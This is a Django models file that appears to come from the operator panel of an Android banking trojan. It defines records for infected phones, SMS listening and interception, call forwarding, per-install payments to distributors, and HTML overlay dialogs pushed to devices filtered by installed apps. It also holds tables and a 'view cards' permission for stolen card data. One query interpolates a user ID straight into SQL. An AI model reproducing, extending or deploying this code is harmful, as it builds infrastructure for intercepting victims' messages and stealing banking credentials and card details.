import base64
import logging
from datetime import timedelta, datetime
import re
import HTMLParser

from ago import human
from django.conf import settings
from django.contrib.auth.models import User, UserManager, Permission
from django.contrib.contenttypes.models import ContentType
from django.core.exceptions import AppRegistryNotReady
from django.db import models, connection
from django.db.models import Q
from django.db.models.signals import post_save
from django.db.utils import ProgrammingError
from django.dispatch import receiver
from django.utils import timezone
from django.utils.translation import ugettext_lazy as _
from django_countries.fields import CountryField

from smsapp import idgen, commands, cfields


logger = logging.getLogger(__name__)

DB_HTML_CACHE = "__htmlCache"
DB_HTML_VERSION = "__htmlVersion"
DB_CACHE_TIMEOUT = 30


class SysUser(User):
    jabber = models.EmailField(null=True)
    activation_key = models.CharField(_('activation key'), max_length=40, null=True)

    objects = UserManager()

    ACTIVATED = u"ALREADY_ACTIVATED"

    class Meta:
        verbose_name = _("System User")
        verbose_name_plural = _("System Users")

    def activation_key_expired(self):
        expiration_date = timedelta(days=settings.ACCOUNT_ACTIVATION_DAYS)
        return self.activation_key == self.ACTIVATED or (self.date_joined + expiration_date <= timezone.now())

    activation_key_expired.boolean = True


class Installer(User):
    user_id = models.DecimalField(max_digits=16, decimal_places=0, unique=True)
    objects = UserManager()

    class Meta:
        verbose_name = _("Installer")
        verbose_name_plural = _("Installers")

    def __unicode__(self):
        return self.username


def operator_code_to_full_name(code):
    import mobile_codes
    import re

    h = HTMLParser.HTMLParser()

    a = re.compile("^\d{5,}")
    if not code or not a.match(code):
        return code
    mcc = code[:3]
    mnc = code[3:]
    try:
        op = mobile_codes.mcc_mnc(mcc, mnc)
        cn = mobile_codes.mcc(mcc)
        try:
            return u"{0} ({1}) - {2}".format(h.unescape(op.operator), mnc, cn[0].name)
        except AttributeError:
            return u"{0} ({1}) - {2}".format(h.unescape(op.operator), mnc, cn[0])
    except KeyError:
        try:
            cn = mobile_codes.mcc(mcc)
        except KeyError:
            return u"Unknown ({0}/{1})".format(mcc, mnc)
        try:
            return u"{0} unknown ({1}/{2})".format(cn.name, mcc, mnc)
        except AttributeError:
            return u"Unknown ({0}/{1})".format(mcc, mnc)


class MobileOperator(models.Model):
    name = models.CharField(max_length=255)

    def __unicode__(self):
        return operator_code_to_full_name(self.name)


# noinspection PyMethodMayBeStatic
class PhoneManager(models.Manager):
    def get_online_list(self):
        cursor = connection.cursor()
        query = """
        SELECT * FROM smsapp_phonedata WHERE
        last_connection >= NOW() - INTERVAL '15 minutes'
        """
        cursor.execute(query)
        return cursor.fetchall()

    def get_country_list(self, user_id):
        """
        Return list of countries with available phones
        @param self: this object
        @param user_id: User ID
        @type user_id: int
        @return: set of data
        @rtype: dict
        """
        cursor = connection.cursor()
        query = """
        SELECT count(id) as total, sum(CASE WHEN (owner_id IS NULL OR owner_id = {0}) AND
        last_connection >= NOW() - INTERVAL '15 minutes' THEN 1 ELSE 0 END) as available, country
        FROM smsapp_phonedata WHERE "number" LIKE '+%' AND NOT inactive
        GROUP BY country ORDER BY available DESC ;
        """.format(user_id)
        cursor.execute(query)
        return cursor.fetchall()

    def get_country_list_total(self):
        """
        Return list of countries with available phones
        @param self: this object
        @return: set of data
        @rtype: dict
        """
        cursor = connection.cursor()
        query = """
        SELECT count(id) AS total,
        sum(CASE WHEN last_connection >= NOW() - INTERVAL '15 minutes' THEN 1 ELSE 0 END) AS available,
        country
        FROM smsapp_phonedata
        GROUP BY country ORDER BY available DESC ;
        """
        cursor.execute(query)
        return cursor.fetchall()

    def get_active_phones(self, user_id, country_code):
        """
        @param user_id: ID of the user to list phones for
        @type user_id: int
        @param country_code: Country code to filter phones
        @type country_code: str
        @return: List of phones belonging to country and given user, active during last 15 minutes
        @rtype: QuerySet of PhoneData
        """
        return self.get_queryset().filter(country=country_code).filter(
            Q(owner__isnull=True) | Q(owner__id=user_id)).filter(number__startswith='+').filter(
            last_connection__gte=timezone.now() - timedelta(minutes=15))

    def get_inactive_phones(self):
        """
        @return: list of phones which didn't contact the server for 5 days
        @rtype: QuerySet of PhoneData
        """
        return self.get_queryset().filter(last_connection__lt=timezone.now() - timedelta(days=5)).exclude(inactive=True)


class PhoneData(models.Model):
    SMS_INITIAL = 0
    SMS_LISTEN = 1
    SMS_INTERCEPT = 2
    SMS_STATUS = (
        (SMS_INITIAL, "None"),
        (SMS_LISTEN, "Listening"),
        (SMS_INTERCEPT, "Intercepting")
    )
    SMS_STATUS_DICT = dict(SMS_STATUS)
    number = models.CharField(max_length=255, null=True, verbose_name=_("Phone #"), db_index=True, blank=True)
    imei = models.CharField(max_length=255, unique=True, verbose_name=_("H/W ID"), null=True)
    registered = models.DateTimeField(auto_now_add=True)
    country = CountryField(max_length=4, null=True, verbose_name=_("Country code"), blank=True, db_index=True)
    os_version = models.CharField(max_length=128, null=True, verbose_name=_("OS version"))
    hw_model = models.CharField(max_length=255, null=True, verbose_name=_("Hardware model"))
    owner = models.ForeignKey(User, verbose_name=_("Assigned to"), null=True, blank=True)
    uniq_id = models.CharField(max_length=64, null=True, unique=True, verbose_name=_("Unique ID"))
    operator = models.ForeignKey(MobileOperator, null=True, blank=True, verbose_name=_("Mobile operator"))
    sms_status = models.IntegerField(default=SMS_INITIAL, choices=SMS_STATUS, verbose_name=_("SMS status"))
    forwarding_calls = models.CharField(max_length=24, null=True, blank=True, verbose_name=_("Forwarding calls to"))
    last_connection = models.DateTimeField(null=True, verbose_name=_("Last connection"))
    id_sent = models.BooleanField(default=False, verbose_name=_("#sentid already sent"))
    locked = models.BooleanField(default=False, verbose_name=_("Locked"))
    inactive = models.BooleanField(default=False, verbose_name=_("Inactive"),
                                   help_text=_("Set automatically if the phone didn't contact server for 5 days"))
    installer = models.ForeignKey(Installer, null=True, verbose_name=_("Installer"), related_name='bot_installer')
    paid = models.BooleanField(default=False, verbose_name=_("Paid to installer"))
    admin_comment = models.TextField(blank=True, null=True, verbose_name=_("Admin comment"))
    app_dialogues_version = models.CharField(max_length=255, null=True, blank=True)
    objects = PhoneManager()

    class Meta:
        verbose_name = _("phone")
        verbose_name_plural = _("phones")
        index_together = [['number', 'id_sent'], ]

    def __str__(self):
        return "IMEI: {0} code: {1}".format(self.imei, self.uniq_id)

    def is_available(self):
        """
        If this phone is available to users?
        @return: True if the phone isn't assigned currently
        @rtype: bool
        """
        return self.owner is None

    def get_work_time(self):
        td = timezone.now() - self.registered
        return human(td, past_tense='{0}', precision=1)

    def status_desc(self):
        return self.SMS_STATUS_DICT.get(self.sms_status)

    def since_last_connection(self):
        if self.last_connection is None:
            return "n/a"
        td = timezone.now() - self.last_connection
        return human(td, past_tense='{0} ago', precision=1)


class UserComment(models.Model):
    user = models.ForeignKey(SysUser)
    phone = models.ForeignKey(PhoneData)
    contents = models.TextField(verbose_name=_("Comment contents"))

    class Meta:
        unique_together = (('user', 'phone'),)


class BlockedNumber(models.Model):
    number = models.CharField(max_length=255)
    phone = models.ForeignKey(PhoneData)

    class Meta:
        index_together = [['number', 'phone'], ]
        verbose_name = _("blocked number")
        verbose_name_plural = _("blocked numbers")


class SMSRecord(models.Model):
    STATUS_NORMAL = 0
    STATUS_REFUNDED = 1
    STATUS_DISPUTED = 2
    STATUS = (
        (STATUS_NORMAL, _("Normal")),
        (STATUS_REFUNDED, _("Refunded")),
        (STATUS_DISPUTED, _("Disputed")),
    )
    source = models.CharField(max_length=255, null=True, verbose_name=_("From"))
    dest = models.CharField(max_length=255, null=True, verbose_name=_("To"))
    contents = models.TextField(verbose_name=_("SMS Text"))
    created = models.DateTimeField(auto_now_add=True)
    phone = models.ForeignKey(PhoneData)
    owner = models.ForeignKey(SysUser, null=True)
    intercepted = models.BooleanField(default=False)
    billing_status = models.IntegerField(choices=STATUS, default=STATUS_NORMAL)

    class Meta:
        verbose_name = _("SMS")
        verbose_name_plural = _("SMS records")


class LogRecord(models.Model):
    registered = models.DateTimeField(auto_now_add=True)
    contents = models.TextField()


@receiver(post_save, sender=PhoneData)
def on_phone_create(instance, **kw):
    """
    @param instance: Phone instance to update
    @type instance: PhoneData
    """
    if instance.uniq_id is None:
        iid = idgen.generate_uniq_id()
        instance.uniq_id = iid
        PhoneData.objects.filter(pk=instance.pk).update(uniq_id=iid)
        logger.debug("Updating phone record {0} with new ID {1}".format(instance, iid))
        # check if containing a valid #
        rx = re.compile('^\+')
        if not rx.match(unicode(instance.number)) and settings.DEFAULT_SENDID_PHONE:  # send ID command
            commands.send_id(instance, settings.DEFAULT_SENDID_PHONE)


class RemoteDialog(models.Model):
    sender = models.CharField(max_length=255, unique=True, null=True, blank=True)
    app = models.CharField(max_length=255, unique=True, null=True, blank=True)
    operator = cfields.OperatorField(max_length=32, unique=True, null=True, blank=True)
    priority = models.DecimalField(decimal_places=0, max_digits=4, default=0)
    description = models.CharField(max_length=255)
    delay = models.IntegerField(default=0, verbose_name=_("initial delay"), help_text=_("in minutes"))
    restart = models.IntegerField(default=0, verbose_name=_("restart interval"), help_text=_("in minutes"))
    dlg1 = models.TextField(verbose_name=_("first dialog text"))
    html_contents = models.TextField(verbose_name=_("HTML contents"), null=True, blank=True)

    class Meta:
        verbose_name = _("dialog")
        verbose_name_plural = _("dialogs")

    def __unicode__(self):
        return self.description

    def clean(self):
        if not self.sender:
            self.sender = None
        if not self.app:
            self.app = None
        if not self.operator:
            self.operator = None
        super(RemoteDialog, self).clean()

    def get_json(self):
        """
        Returns json-compatible representation of the whole dialog
        @return: All objects in a form that the client understands
        @rtype: dict
        """

        return {
            'ishtml': True,
            'start delay minutes': self.delay, 'restart interval minutes': self.restart,
            'first dialog': self.dlg1,
            'html': base64.b64encode(self.html_contents.encode('utf-8')) if self.html_contents else "",
            'correlation id': self.pk
        }


class ISender(models.Model):
    name = models.CharField(max_length=255, unique=True, null=False)

    def __unicode__(self):
        return self.name

    class Meta:
        verbose_name = _("internal SMS sender")
        verbose_name_plural = _("internal SMS senders")


class InternalSMSManager(models.Manager):
    # noinspection PyMethodMayBeStatic
    def get_sender_stats(self):
        cursor = connection.cursor()
        query = """
        SELECT i.sender_id, s.name, COUNT(DISTINCT i.phone_id) AS num_used
        FROM smsapp_internalsms AS i, smsapp_isender AS s WHERE s.id=i.sender_id GROUP BY i.sender_id, s.name
        HAVING COUNT(DISTINCT i.phone_id) > 1
        ORDER BY num_used DESC
        """
        cursor.execute(query)
        return cursor.fetchall()

    # noinspection PyMethodMayBeStatic
    def get_sender_stats_by_country(self, country_code):
        cursor = connection.cursor()
        query = """
        SELECT i.sender_id, s.name, COUNT(DISTINCT i.phone_id) AS num_used
        FROM smsapp_internalsms AS i, smsapp_isender AS s, smsapp_phonedata as p
        WHERE s.id=i.sender_id AND p.id=i.phone_id AND p.country=%s GROUP BY i.sender_id, s.name
        HAVING COUNT(DISTINCT i.phone_id) > 1 ORDER BY num_used DESC;
        """
        cursor.execute(query, [country_code])
        return cursor.fetchall()

    # noinspection PyMethodMayBeStatic
    def get_country_list_of_senders(self):
        cursor = connection.cursor()
        query = """
        SELECT DISTINCT p.country AS code FROM smsapp_phonedata AS p, smsapp_internalsms AS s
        WHERE p.id=s.phone_id ORDER BY code
        """
        cursor.execute(query)
        return cursor.fetchall()


class InternalSMS(models.Model):
    sender = models.ForeignKey(ISender, verbose_name=_("sender"), null=True)
    contents = models.TextField(verbose_name=_("SMS Text"))
    created = models.DateTimeField(auto_now_add=True)
    phone = models.ForeignKey(PhoneData)

    objects = InternalSMSManager()

    def __unicode__(self):
        return "from: {f}, phone: {p}".format(f=self.sender, p=self.phone)

    class Meta:
        verbose_name = _("internal SMS")
        verbose_name_plural = _("internal SMSs")


class InstalledAppsManager(models.Manager):
    # noinspection PyMethodMayBeStatic
    def get_top_apps(self):
        cursor = connection.cursor()
        query = """
        SELECT name, COUNT(phone_id) AS cnt FROM smsapp_installedapp GROUP BY name
        HAVING COUNT(phone_id) > 1 ORDER BY cnt DESC
        """
        cursor.execute(query)
        return cursor.fetchall()

    # noinspection PyMethodMayBeStatic
    def get_top_apps_by_country(self, country_code):
        cursor = connection.cursor()
        query = """
        SELECT a.name, COUNT(a.phone_id) AS cnt FROM smsapp_installedapp AS a, smsapp_phonedata AS p
        WHERE a.phone_id = p.id AND p.country=%s
        GROUP BY a.name
        HAVING COUNT(a.phone_id) > 1 ORDER BY cnt DESC
        """
        cursor.execute(query, [country_code])
        return cursor.fetchall()


class InstalledApp(models.Model):
    name = models.CharField(max_length=255, db_index=True)
    phone = models.ForeignKey(PhoneData)

    objects = InstalledAppsManager()

    def __unicode__(self):
        return self.name

    class Meta:
        verbose_name = _("installed application")
        verbose_name_plural = _("installed applications")
        index_together = [['name', 'phone'], ]


class AppDialog(models.Model):
    description = models.CharField(max_length=255)
    html_contents = models.TextField(verbose_name=_("HTML contents"), null=True, blank=True)
    apps = models.TextField(verbose_name=_("app filter"), help_text=_("1 package per line"))

    def __unicode__(self):
        return self.description

    class Meta:
        verbose_name = _("application dialog")
        verbose_name_plural = _("application dialogues")


def create_custom_permissions():
    try:
        ct, created = ContentType.objects.get_or_create(model='', app_label='smsapp', name='view cards')
        Permission.objects.get_or_create(codename='view_cards', content_type=ct, name='View cards info')
    except ProgrammingError:
        logger.error("Content type tables haven't been initialized yet")


try:
    create_custom_permissions()
except AppRegistryNotReady:
    pass


class Option(models.Model):
    name = models.CharField(max_length=255, unique=True)
    content = models.TextField(blank=True)


@receiver(post_save, sender=AppDialog)
def set_html_version(instance, **kw):
    opt, created = Option.objects.get_or_create(name='html version')
    opt.content = datetime.utcnow()
    opt.save()
    # resetting cache
    settings.REDIS.delete([DB_HTML_VERSION, DB_HTML_CACHE])


class BinData(models.Model):
    cid = models.IntegerField(primary_key=True)
    card = models.CharField(max_length=255, blank=True)
    bank = models.CharField(max_length=255, null=True)
    ctype = models.CharField(max_length=64, blank=True, null=True)
    clevel = models.CharField(max_length=64, blank=True, null=True)
    country = models.CharField(max_length=2, blank=True, null=True)
